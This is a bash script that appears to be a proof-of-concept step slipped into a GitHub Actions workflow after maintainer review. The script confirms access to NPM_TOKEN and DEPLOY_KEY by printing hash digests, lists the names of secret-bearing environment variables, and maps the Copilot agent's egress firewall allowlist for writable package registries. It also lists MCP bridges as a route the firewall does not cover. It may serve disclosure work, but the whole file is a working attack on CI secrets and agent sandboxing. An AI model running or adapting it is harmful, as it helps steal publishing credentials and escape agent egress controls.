#!/usr/bin/env bash
echo "=== INJECTED-STEP ENV READ  repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID ==="
# Log masking hides exact secret values, so prove possession by digest instead.
for name in NPM_TOKEN DEPLOY_KEY; do
  val="${!name}"
  if [ -n "$val" ]; then
    d=$(printf "%s" "$val" | sha256sum | cut -c1-24)
    echo "SECRET_${name}_PRESENT=yes LEN=${#val} SHA256_24=$d"
  else
    echo "SECRET_${name}_PRESENT=no"
  fi
done
echo "--- full env keys visible to the injected step ---"
env | cut -d= -f1 | grep -iE "token|key|secret|deploy|npm" | sort | sed "s/^/ENVKEY=/"
echo "=== END ==="

echo "=== EGRESS ALLOWLIST AS ENFORCED IN THIS RUN ==="
for v in COPILOT_FIREWALL_ALLOW_LIST COPILOT_AGENT_FIREWALL_ALLOW_LIST; do
  [ -n "${!v:-}" ] && { echo "ENVVAR=$v COUNT=$(printf '%s' "${!v}" | tr ',' '\n' | grep -c .)"; printf '%s' "${!v}" | tr ',' '\n' | grep -iE "npmjs|pypi|crates|rubygems|packagist|nuget|maven" | sed 's/^/ALLOWED_WRITABLE_REGISTRY=/'; }
done
[ -f /home/runner/work/_temp/runtime-logs/fw.jsonl ] && echo "FW_LOG_PRESENT=yes lines=$(wc -l < /home/runner/work/_temp/runtime-logs/fw.jsonl)"
echo "--- MCP servers bridged in this runtime (firewall does not apply to MCP per GitHub docs) ---"
ps -eo args 2>/dev/null | grep -o 'mcp-proxy-bridge.js[^ ]* --proxy-url=[^ ]* --server-name=[^ ]*' | sort -u | sed 's/^/MCP_BRIDGE=/'
echo "=== END ALLOWLIST CAPTURE ==="

echo "POST_REVIEW_MARKER=this line did not exist when the maintainer reviewed and merged the workflow"
echo "POST_REVIEW_COMMIT_UTC=2026-07-30T02:19:58Z"
